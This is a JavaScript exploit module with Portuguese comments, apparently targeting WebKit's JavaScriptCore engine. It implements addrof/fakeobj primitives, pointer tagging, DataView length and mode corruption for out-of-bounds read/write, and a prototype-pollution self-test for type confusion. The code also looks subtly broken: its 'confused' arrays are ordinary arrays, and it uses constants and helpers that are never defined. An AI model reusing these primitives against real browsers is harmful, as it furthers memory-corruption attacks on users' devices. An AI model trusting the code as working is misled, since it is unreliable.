// js/core_exploit.mjs (v31.15 - Versão Corrigida do triggerOOB_primitive)

import { AdvancedInt64, PAUSE, toHex, log, setLogFunction, isAdvancedInt64Object } from './utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

const toHexHelper = (val, bits = 32) => {
    if (isAdvancedInt64Object(val)) {
        try {
            const strVal = val.toString(true);
            if (typeof strVal === 'string' && strVal !== 'undefined') {
                return strVal;
            }
        } catch (e) { /* ignora, usa fallback */ }
        return `AdvInt64(low:0x${val.low().toString(16)},high:0x${val.high().toString(16)})`;
    }
    if (typeof val === 'number') {
        return toHex(val, bits);
    }
    return String(val);
};

// Offsets para os metadados do DataView no oob_array_buffer_real para o OOB LOCAL.
const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; // Offset do início do ArrayBuffer real onde os metadados do DataView estão.
const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

// --- PRIMITIVAS CORE ADDROF/FAKEOBJ (Baseadas em Heisenbug/Type Confusion) ---
let _core_confused_array_main = null;
let _core_victim_array_main = null;

const CONFUSED_FLOAT64_ARRAY_INDEX = 0;
const FAKED_OBJECT_INDEX = 0;

function _int64ToDouble_core(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function _doubleToInt64_core(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

export function initCoreAddrofFakeobjPrimitives() {
    const FNAME = "initCoreAddrofFakeobjPrimitives";
    if (_core_confused_array_main && _core_victim_array_main) {
        log(`[${FNAME}] Primitivas addrof/fakeobj diretas já estão configuradas.`, "info", FNAME);
        return;
    }
    _core_confused_array_main = new Float64Array([13.37]);
    _core_victim_array_main = [{ a: 1 }];

    log(`[${FNAME}] Primitivas addrof/fakeobj diretas inicializadas.`, "good", FNAME);
}

export function addrof_core(obj) {
    const FNAME = 'CoreExploit.addrof_core';
    if (!_core_confused_array_main || !_core_victim_array_main) {
        log(`[${FNAME}] ERRO: Primitivas addrof/fakeobj diretas não foram inicializadas. Chame initCoreAddrofFakeobjPrimitives() primeiro.`, "critical", FNAME);
        throw new Error("Core addrof/fakeobj primitives not initialized.");
    }
    if (!(_core_confused_array_main instanceof Float64Array)) {
        log(`[${FNAME}] ERRO: _core_confused_array_main não é um Float64Array. Tipo: ${typeof _core_confused_array_main}`, "critical", FNAME);
        throw new Error("Invalid internal array for addrof.");
    }
    if (!Array.isArray(_core_victim_array_main)) {
        log(`[${FNAME}] ERRO: _core_victim_array_main não é um Array. Tipo: ${typeof _core_victim_array_main}`, "critical", FNAME);
        throw new Error("Invalid internal array for addrof.");
    }

    _core_victim_array_main[FAKED_OBJECT_INDEX] = obj;
    const tagged_addr = _doubleToInt64_core(_core_confused_array_main[CONFUSED_FLOAT64_ARRAY_INDEX]);
    log(`[${FNAME}] DEBUG: Endereço bruto (potencialmente tagged) lido: ${tagged_addr.toString(true)}`, "debug", FNAME);

    let untagged_addr = tagged_addr;
    const original_high = tagged_addr.high();
    const untagged_high = original_high & 0x0000FFFF;
    if (original_high !== untagged_high) {
        untagged_addr = new AdvancedInt64(tagged_addr.low(), untagged_high);
        log(`[${FNAME}] DEBUG: Endereço após untagging (high original: 0x${original_high.toString(16)} -> high untagged: 0x${untagged_high.toString(16)}): ${untagged_addr.toString(true)}`, "debug", FNAME);
    } else {
        log(`[${FNAME}] DEBUG: Nenhum untagging aplicado (high original 0x${original_high.toString(16)}).`, "debug", FNAME);
    }

    if (!isAdvancedInt64Object(untagged_addr) || untagged_addr.equals(AdvancedInt64.Zero) || untagged_addr.equals(AdvancedInt64.NaNValue)) {
        log(`[${FNAME}] FALHA: Endereço retornado para ${obj} (${untagged_addr ? untagged_addr.toString(true) : 'N/A'}) parece inválido ou nulo/NaN após untagging.`, "error", FNAME);
        throw new Error(`Failed to get address of ${obj}. Invalid address.`);
    }
    log(`[${FNAME}] SUCESSO: Endereço (final, untagged) retornado para objeto ${obj} (tipo: ${typeof obj}): ${untagged_addr.toString(true)}`, "debug", FNAME);
    return untagged_addr;
}

export function fakeobj_core(addr) {
    const FNAME = 'CoreExploit.fakeobj_core';
    if (!_core_confused_array_main || !_core_victim_array_main) {
        log(`[${FNAME}] ERRO: Primitivas addrof/fakeobj diretas não foram inicializadas. Chame initCoreAddrofFakeobjPrimitives() primeiro.`, "critical", FNAME);
        throw new Error("Core addrof/fakeobj primitives not initialized.");
    }
    if (!(_core_confused_array_main instanceof Float64Array)) {
        log(`[${FNAME}] ERRO: _core_confused_array_main não é um Float64Array. Tipo: ${typeof _core_confused_array_main}`, "critical", FNAME);
        throw new Error("Invalid internal array for fakeobj.");
    }
    if (!Array.isArray(_core_victim_array_main)) {
        log(`[${FNAME}] ERRO: _core_victim_array_main não é um Array. Tipo: ${typeof _core_victim_array_main}`, "critical", FNAME);
        throw new Error("Invalid internal array for fakeobj.");
    }

    if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
        log(`[${FNAME}] ERRO: Endereço para fakeobj (${addr.toString(true)}) é inválido ou nulo/NaN.`, "error", FNAME);
        throw new Error(`Invalid address for fakeobj: ${addr.toString(true)}.`);
    }

    let tagged_addr = addr;
    const OBJECT_PTR_TAG_HIGH = 0x402a0000;
    if (addr.high() < 0x10000) {
        tagged_addr = new AdvancedInt64(addr.low(), addr.high() | OBJECT_PTR_TAG_HIGH);
        log(`[${FNAME}] DEBUG: Endereço após tagging (original: ${addr.toString(true)} -> tagged: ${tagged_addr.toString(true)})`, "debug", FNAME);
    } else {
        log(`[${FNAME}] DEBUG: Nenhum tagging aplicado ao high (0x${addr.high().toString(16)}). Assumindo que já está taggeado ou não precisa.`, "debug", FNAME);
    }

    _core_confused_array_main[CONFUSED_FLOAT64_ARRAY_INDEX] = _int64ToDouble_core(tagged_addr);
    const obj = _core_victim_array_main[FAKED_OBJECT_INDEX];

    if (obj === undefined || obj === null) {
        log(`[${FNAME}] ALERTA: Objeto forjado para ${addr.toString(true)} é nulo/undefined. Pode ser ser um objeto inválido.`, "warn", FNAME);
    } else {
        try {
            const typeof_faked_obj = typeof obj;
            if (typeof_faked_obj === 'number' || typeof_faked_obj === 'boolean' || typeof_faked_obj === 'string') {
                 log(`[${FNAME}] ALERTA: Objeto forjado para ${addr.toString(true)} não é um tipo de objeto (recebido: ${typeof_faked_obj}). Pode ser uma corrupção.`, "warn", FNAME);
            } else {
                 log(`[${FNAME}] SUCESSO: Objeto forjado retornado para endereço ${addr.toString(true)}: ${obj} (typeof: ${typeof obj})`, "debug", FNAME);
            }
        } catch (e) {
            log(`[${FNAME}] ALERTA: Erro ao inspecionar objeto forjado para ${addr.toString(true)}: ${e.message}`, "warn", FNAME);
        }
    }
    return obj;
}
// --- FIM DAS PRIMITIVAS CORE ADDROF/FAKEOBJ ---


// --- PRIMITIVAS OOB LOCAIS (oob_read_absolute / oob_write_absolute) ---
// Capacidade: Leitura/escrita Out-Of-Bounds (OOB) APENAS DENTRO do ArrayBuffer real
//            que foi criado no triggerOOB_primitive, e na memória diretamente adjacente a ele
//            que o sistema permite o acesso (limitado pela sandbox).
// Limitações: NÃO É LEITURA/ESCRITA ARBITRÁRIA UNIVERSAL. Não consegue ler/escrever em
//            endereços fora da região de acesso do oob_dataview_real (ex: outros objetos no heap JS,
//            ou a própria biblioteca WebKit) através da manipulação de m_vector.
//            Retorna zeros em leituras fora dos limites permitidos.
export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
    oob_array_buffer_real = null;
    oob_dataview_real = null;
    isOOBEnvironmentSetup = false;
    log(`[CoreExploit] Ambiente OOB limpo.`, "debug");
}

export function getOOBAllocationSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.ALLOCATION_SIZE;
}

export function getBaseOffsetInDV() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.BASE_OFFSET_IN_DV;
}

export function getInitialBufferSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.INITIAL_BUFFER_SIZE;
}

export async function triggerOOB_primitive(options = { force_reinit: false }) {
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
    if (isOOBEnvironmentSetup && !options.force_reinit) {
        let currentLength = 0;
        let currentMode = 0;
        try {
            if (oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET + 3) {
                currentLength = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true);
                currentMode = oob_dataview_real.getUint32(OOB_DV_M_MODE_OFFSET, true);
            } else {
                log(`[${FNAME_TRIGGER}] ALERTA: DataView ou ArrayBuffer real não estão válidos para verificação. Forçando re-inicialização.`, 'warn');
                clearOOBEnvironment({ force_clear_even_if_not_setup: true });
            }
        } catch (e) {
            log(`[${FNAME_TRIGGER}] ERRO ao verificar estado do DataView: ${e.message}. Forçando re-inicialização.`, 'warn');
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }

        const EXPECTED_OOB_MODE = JSC_OFFSETS.DataView.M_MODE_CANDIDATES[0];
        if (oob_array_buffer_real && oob_dataview_real &&
            oob_array_buffer_real.byteLength === getOOBAllocationSize() &&
            oob_dataview_real.buffer === oob_array_buffer_real &&
            currentLength === 0xFFFFFFFF &&
            currentMode === EXPECTED_OOB_MODE) {
            log(`[${FNAME_TRIGGER}] Ambiente OOB já configurado e expandido (m_mode OK). Nenhuma ação necessária.`, 'info');
            return true;
        } else {
            log(`[${FNAME_TRIGGER}] Ambiente OOB inconsistente. currentLength: ${toHex(currentLength)}, currentMode: ${toHex(currentMode)}. Forçando re-inicialização.`, 'warn', FNAME_TRIGGER);
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }
    }
    log(`--- Iniciando Configuração do Ambiente OOB (Force reinit: ${options.force_reinit}, Setup anterior: ${isOOBEnvironmentSetup}) ---`, 'test', FNAME_TRIGGER);
    const currentAllocSize = getOOBAllocationSize();
    log(`    Config OOB: AllocSize=${currentAllocSize}`, 'info', FNAME_TRIGGER);
    clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);

        if (oob_dataview_real.buffer !== oob_array_buffer_real) {
            const errorMsg = `[${FNAME_TRIGGER}] ERRO CRÍTICO: DataView não está associado ao ArrayBuffer real após criação!`;
            log(errorMsg, 'critical', FNAME_TRIGGER);
            throw new Error(errorMsg);
        }

        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET + 3) {
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, true);
            log(`    m_length do oob_dataview_real expandido para 0xFFFFFFFF no offset ${toHex(OOB_DV_M_LENGTH_OFFSET)}.`, 'info', FNAME_TRIGGER);
        } else {
            const errorMsg = `Falha ao expandir m_length: currentAllocSize (${currentAllocSize}) é muito pequeno para o offset ${toHex(OOB_DV_M_LENGTH_OFFSET)}.`;
            log(errorMsg, 'critical', FNAME_TRIGGER);
            throw new Error(errorMsg);
        }

        const OOB_DATA_VIEW_MODE = JSC_OFFSETS.DataView.M_MODE_CANDIDATES[0];
        if (currentAllocSize > OOB_DV_M_MODE_OFFSET + 3) {
            oob_dataview_real.setUint32(OOB_DV_M_MODE_OFFSET, OOB_DATA_VIEW_MODE, true);
            log(`    m_mode do oob_dataview_real configurado para ${toHex(OOB_DATA_VIEW_MODE)} no offset ${toHex(OOB_DV_M_MODE_OFFSET)}.`, 'info', FNAME_TRIGGER);
        } else {
            const errorMsg = `Falha ao configurar m_mode: currentAllocSize (${currentAllocSize}) é muito pequeno para o offset ${toHex(OOB_DV_M_MODE_OFFSET)}.`;
            log(errorMsg, 'critical', FNAME_TRIGGER);
            throw new Error(errorMsg);
        }

        // NOVO: Auto-reparo do m_vector do oob_dataview_real.
        // Se o m_vector inicial for 0 (comportamento observado nos logs),
        // isso o corrige para o endereço real do oob_array_buffer_real.
        // Isso é CRÍTICO para o oob_read_absolute/oob_write_absolute funcionar fora dos metadados.
        const oob_array_buffer_real_addr = addrof_core(oob_array_buffer_real);
        // O offset do m_vector em relação à base do DataView (0x58)
        const DV_M_VECTOR_OFFSET_IN_OOB_BUFFER_RELATIVE_TO_BASE = JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // Este é 0x10.
        // Endereço absoluto do m_vector DENTRO do oob_array_buffer_real
        const ABSOLUTE_M_VECTOR_ADDR_IN_OOB_BUFFER = addrof_core(oob_dataview_real).add(DV_M_VECTOR_OFFSET_IN_OOB_BUFFER_RELATIVE_TO_BASE);

        // A `oob_write_absolute` precisa do offset relativo ao *início do oob_dataview_real*.
        // O `oob_dataview_real` é criado com offset 0, então os offsets são absolutos dentro do oob_array_buffer_real.
        const OOB_OFFSET_TO_M_VECTOR = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;


        log(`    DEBUG: Tentando auto-reparar m_vector do oob_dataview_real em offset ${toHex(OOB_OFFSET_TO_M_VECTOR)} para ${oob_array_buffer_real_addr.toString(true)}.`, 'debug', FNAME_TRIGGER);
        oob_write_absolute(OOB_OFFSET_TO_M_VECTOR, oob_array_buffer_real_addr, 8);
        log(`    DEBUG: m_vector do oob_dataview_real APÓS auto-reparo: ${toHexHelper(oob_read_absolute(OOB_OFFSET_TO_M_VECTOR, 8))}.`, 'debug', FNAME_TRIGGER);


        log(`[${FNAME_TRIGGER}] Ambiente para Operações OOB CONFIGURADO com sucesso.`, 'good', FNAME_TRIGGER);
        log(`    oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_TRIGGER);
        log(`    oob_dataview_real (janela controlada): offset=${oob_dataview_real.byteOffset}, length=${toHex(oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true))}, mode=${toHex(oob_dataview_real.getUint32(OOB_DV_M_MODE_OFFSET, true))} (m_length/m_mode expandidos)`, 'info', FNAME_TRIGGER);
        isOOBEnvironmentSetup = true;
        log(`--- Configuração do Ambiente OOB Concluída ---`, 'test', FNAME_TRIGGER);
        return true;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER);
        console.error(e);
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        throw e;
    }
}

export function oob_read_absolute(offset_in_oob_buffer, byteLength) {
    const FNAME_READ = 'CoreExploit.oob_read_absolute';
    if (!isOOBReady()) {
        log(`ERRO: Ambiente OOB não inicializado/inválido para oob_read_absolute em ${toHex(offset_in_oob_buffer)}`, "error", FNAME_READ);
        throw new Error("Ambiente OOB não inicializado/inválido para oob_read_absolute.");
    }
    if (!oob_dataview_real.buffer || oob_dataview_real.byteLength === 0) {
        log(`ERRO: DataView de OOB está detached/corrompido antes da leitura em ${toHex(offset_in_oob_buffer)}`, "critical", FNAME_READ);
        isOOBEnvironmentSetup = false;
        throw new Error("OOB DataView is detached or corrupted.");
    }

    const currentMode = oob_dataview_real.getUint32(OOB_DV_M_MODE_OFFSET, true);
    const EXPECTED_OOB_MODE = JSC_OFFSETS.DataView.M_MODE_CANDIDATES[0];
    if (currentMode !== EXPECTED_OOB_MODE) {
        log(`ALERTA: m_mode inesperado (${toHex(currentMode)}) para oob_read_absolute em ${toHex(offset_in_oob_buffer)}. Esperado ${toHex(EXPECTED_OOB_MODE)}.`, "warn", FNAME_READ);
    }

    // LIMITAÇÃO CRÍTICA: Esta função só pode ler/escrever dentro da janela expandida do DataView,
    // que é sobre o 'oob_array_buffer_real'. Endereços fora dessa região podem ser zerados ou causar crash.
    if (offset_in_oob_buffer < 0 || (offset_in_oob_buffer + byteLength) > oob_dataview_real.byteLength) {
        const errorMsg = `oob_read_absolute (offset ${toHex(offset_in_oob_buffer)}, tam ${byteLength}) fora dos limites do oob_dataview_real (0-${toHex(oob_dataview_real.byteLength)})`;
        log(errorMsg, "error", FNAME_READ);
        throw new RangeError(errorMsg);
    }
    try {
        switch (byteLength) {
            case 1: return oob_dataview_real.getUint8(offset_in_oob_buffer);
            case 2: return oob_dataview_real.getUint16(offset_in_oob_buffer, true);
            case 4: return oob_dataview_real.getUint32(offset_in_oob_buffer, true);
            case 8: {
                const low = oob_dataview_real.getUint32(offset_in_oob_buffer, true);
                const high = oob_dataview_real.getUint32(offset_in_oob_buffer + 4, true);
                const result = new AdvancedInt64(low, high);
                return result;
            }
            default:
                log(`ERRO: Tamanho de leitura inválido para oob_read_absolute: ${byteLength}`, "error", FNAME_READ);
                throw new Error(`Invalid byteLength for oob_read_absolute: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_READ} ao ler de oob_buffer[${toHex(offset_in_oob_buffer)}]: ${e.message}`, "critical", FNAME_READ);
        console.error(`[${FNAME_READ}] Exception: `, e);
        if (e.message.includes("detached") || e.message.includes("out of bounds")) { isOOBEnvironmentSetup = false; }
        throw e;
    } finally {
        // Nada para restaurar aqui, pois o DataView é sempre usado na sua janela.
    }
}

export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) {
    const FNAME_WRITE = 'CoreExploit.oob_write_absolute';
    if (!isOOBReady()) {
        log(`ERRO: Ambiente OOB não inicializado/inválido para oob_write_absolute em ${toHex(offset_in_oob_buffer)}`, "error", FNAME_WRITE);
        throw new Error("Ambiente OOB não inicializado/inválido para oob_write_absolute.");
    }
    if (!oob_dataview_real.buffer || oob_dataview_real.byteLength === 0) {
        log(`ERRO: DataView de OOB está detached/corrompido antes da escrita em ${toHex(offset_in_oob_buffer)}`, "critical", FNAME_WRITE);
        isOOBEnvironmentSetup = false;
        throw new Error("OOB DataView is detached or corrupted.");
    }

    const currentMode = oob_dataview_real.getUint32(OOB_DV_M_MODE_OFFSET, true);
    const EXPECTED_OOB_MODE = JSC_OFFSETS.DataView.M_MODE_CANDIDATES[0];
    if (currentMode !== EXPECTED_OOB_MODE) {
        log(`ALERTA: m_mode inesperado (${toHex(currentMode)}) para oob_write_absolute em ${toHex(offset_in_oob_buffer)}. Esperado ${toHex(EXPECTED_OOB_MODE)}.`, "warn", FNAME_WRITE);
    }

    if (offset_in_oob_buffer < 0 || (offset_in_oob_buffer + byteLength) > oob_dataview_real.byteLength) {
        const errorMsg = `oob_write_absolute (offset ${toHex(offset_in_oob_buffer)}, tam ${byteLength}) fora dos limites do oob_dataview_real (0-${toHex(oob_dataview_real.byteLength)})`;
        log(errorMsg, "error", FNAME_WRITE);
        throw new RangeError(errorMsg);
    }
    try {
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(offset_in_oob_buffer, Number(value)); break;
            case 2: oob_dataview_real.setUint16(offset_in_oob_buffer, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(offset_in_oob_buffer, Number(value), true); break;
            case 8:
                let val64 = value;
                if (!isAdvancedInt64Object(val64)) {
                    try { val64 = new AdvancedInt64(val64); } catch (convErr) {
                        throw new TypeError(`Valor para oob_write_absolute de 8 bytes deve ser AdvancedInt64 ou conversível: ${convErr.message}`);
                    }
                    if (!isAdvancedInt64Object(val64)) {
                        throw new TypeError(`Valor convertido para oob_write_absolute de 8 bytes não é um AdvancedInt64 válido.`);
                    }
                }
                oob_dataview_real.setUint32(offset_in_oob_buffer, val64.low(), true);
                oob_dataview_real.setUint32(offset_in_oob_buffer + 4, val64.high(), true);
                break;
            default:
                log(`ERRO: Tamanho de escrita inválido para oob_write_absolute: ${byteLength}`, "error", FNAME_WRITE);
                throw new Error(`Invalid byteLength for oob_write_absolute: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_WRITE} ao escrever em oob_buffer[${toHex(offset_in_oob_buffer)}]: ${e.message}`, "critical", FNAME_WRITE);
        if (e.message.includes("detached") || e.message.includes("out of bounds")) { isOOBEnvironmentSetup = false; }
        throw e;
    } finally {
        // Nada para restaurar aqui, pois o DataView é sempre usado na sua janela.
    }
}


export function selfTestTypeConfusionAndMemoryControl(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestTypeConfusionAndMemoryControl';
    currentLog(`--- Iniciando Auto-Teste Combinado (v31.14): Type Confusion e Controle de Memória ---`, 'test', FNAME_TEST);

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;
    let local_probe_details_for_selftest = null;
    let overallSuccess = false;
    let tcPhaseSuccess = false;

    try {
        currentLog(`FASE 1: Testando Type Confusion (usando constantes HEISENBUG_*)...`, "subtest", FNAME_TEST);
        triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Falha ao inicializar ambiente OOB para teste de Type Confusion.");
        }
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_core, HEISENBUG_CRITICAL_WRITE_VALUE_core, 4);
        PAUSE(100);

        let victim_ab_for_selftest = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE_core);
        currentLog(`    (TC SelfTest) victim_ab_for_selftest (tamanho ${HEISENBUG_VICTIM_AB_SIZE_core} bytes) criado.`, "info", FNAME_TEST);

        const toJSON_ProbeForSelfTest = function () {
            local_probe_details_for_selftest = {
                this_type_in_toJSON: Object.prototype.toString.call(this),
                is_victim_direct_ref: (this === victim_ab_for_selftest)
            };
            return { self_test_probe_executed_tc: true, observed_this_type: local_probe_details_for_selftest.this_type_in_toJSON };
        };

        const ppKey_TC = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_TC);
        Object.defineProperty(Object.prototype, ppKey_TC, {
            value: toJSON_ProbeForSelfTest,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        currentLog(`            (TC SelfTest) Object.prototype.${ppKey_TC} poluído com sonda.`, "info", FNAME_TEST);

        let stringifyOutput_TC = JSON.stringify(victim_ab_for_selftest);
        currentLog(`            (TC SelfTest) JSON.stringify completou. Retorno da sonda: "${stringifyOutput_TC}"`, "info", FNAME_TEST);
        currentLog(`            (TC SelfTest) Detalhes da sonda: ${local_probe_details_for_selftest ? JSON.stringify(local_probe_details_for_selftest) : 'N/A'}`, "leak", FNAME_TEST);

        if (local_probe_details_for_selftest && local_probe_details_for_selftest.this_type_in_toJSON === "[object Object]") {
            currentLog(`    (TC SelfTest) SUCESSO (ou SUCESSO PARCIAL): Confusão de tipo detectada! 'this' é [object Object]. (is_victim_direct_ref: ${local_probe_details_for_selftest.is_victim_direct_ref})`, "vuln", FNAME_TEST);
            tcPhaseSuccess = true;
        } else {
            let detailsMsg = local_probe_details_for_selftest ? `is_victim_direct_ref=${local_probe_details_for_selftest.is_victim_direct_ref}, type=${local_probe_details_for_selftest.this_type_in_toJSON}` : "sonda não forneceu detalhes";
            currentLog(`    (TC SelfTest) FALHA: Teste de Type Confusion. Detalhes: ${detailsMsg}. Esperado tipo [object Object].`, "error", FNAME_TEST);
        }
    } catch (e) {
        currentLog(`ERRO na FASE 1 (Type Confusion - SelfTest): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_TC, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_TC];
            currentLog(`            (TC SelfTest) Object.prototype.toJSON restaurado.`, "info", FNAME_TEST);
            pollutionApplied = false;
            originalToJSONDescriptor = null;
        }
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    }

    if (!tcPhaseSuccess) {
        currentLog(`Teste de Type Confusion (SelfTest) falhou. Abortando teste de Controle de Memória.`, 'warn', FNAME_TEST);
    } else {
        PAUSE(200);
        currentLog(`FASE 2: Testando Controle de Memória...`, 'subtest', FNAME_TEST);
        let memoryControlPhaseSuccess = false;
        try {
            if (!isOOBReady()) {
                currentLog(`    (MC) Ambiente OOB não estava pronto. Reconfigurando...`, 'warn', FNAME_TEST);
                triggerOOB_primitive({ force_reinit: true });
                if (!isOOBReady()) throw new Error("Falha ao (re)inicializar ambiente OOB para teste de Controle de Memória.");
            }
            const OFFSET_M_LENGTH_TARGET = OOB_DV_M_LENGTH_OFFSET;
            const OFFSET_M_MODE_TARGET = OOB_DV_M_MODE_OFFSET;

            const PLANT_M_LENGTH = 0xBABEFACE;
            const PLANT_M_MODE = 0x00000001;

            currentLog(`    (MC) Configurando m_length e m_mode...`, 'info', FNAME_TEST);
            oob_write_absolute(OFFSET_M_LENGTH_TARGET, PLANT_M_LENGTH, 4);
            oob_write_absolute(OFFSET_M_MODE_TARGET, PLANT_M_MODE, 4);
            currentLog(`        m_length (@${toHex(OFFSET_M_LENGTH_TARGET)}) para ${toHex(PLANT_M_LENGTH)}`, 'info', FNAME_TEST);
            currentLog(`        m_mode (@${toHex(OFFSET_M_MODE_TARGET)}) para ${toHex(PLANT_M_MODE)}`, 'info', FNAME_TEST);

            currentLog(`    (MC) Verificando valores plantados:`, 'info', FNAME_TEST);
            const read_m_length_val = oob_read_absolute(OFFSET_M_LENGTH_TARGET, 4);
            const read_m_mode_val = oob_read_absolute(OFFSET_M_MODE_TARGET, 4);

            currentLog(`        Lido m_length (@${toHex(OFFSET_M_LENGTH_TARGET)}): ${toHex(read_m_length_val)}`, "leak", FNAME_TEST);
            currentLog(`        Lido m_mode    (@${toHex(OFFSET_M_MODE_TARGET)}): ${toHex(read_m_mode_val)}`, "leak", FNAME_TEST);

            if (read_m_length_val === PLANT_M_LENGTH && read_m_mode_val === PLANT_M_MODE) {
                currentLog(`    (MC) SUCESSO: Controle de m_length e m_mode verificado!`, "vuln", FNAME_TEST);
                memoryControlPhaseSuccess = true;
            } else {
                if (read_m_length_val !== PLANT_M_LENGTH) {
                    currentLog(`    (MC) FALHA: m_length lido (${toHex(read_m_length_val)}) não corresponde ao plantado (${toHex(PLANT_M_LENGTH)}).`, "error", FNAME_TEST);
                }
                if (read_m_mode_val !== PLANT_M_MODE) {
                    currentLog(`    (MC) FALHA: m_mode lido (${toHex(read_m_mode_val)}) não corresponde ao plantado (${toHex(PLANT_M_MODE)}).`, "error", FNAME_TEST);
                }
            }
        } catch (e) {
            currentLog(`ERRO na FASE 2 (Controle de Memória - SelfTest): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
        } finally {
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }
        if (tcPhaseSuccess && memoryControlPhaseSuccess) {
            overallSuccess = true;
        }
    }

    currentLog(`--- Auto-Teste Combinado CONCLUÍDO ${overallSuccess ? 'COM SUCESSO' : 'COM FALHA'} ---`, 'test', FNAME_TEST);
    return overallSuccess;
}

export function getOOBDataView() {
    return oob_dataview_real;
}
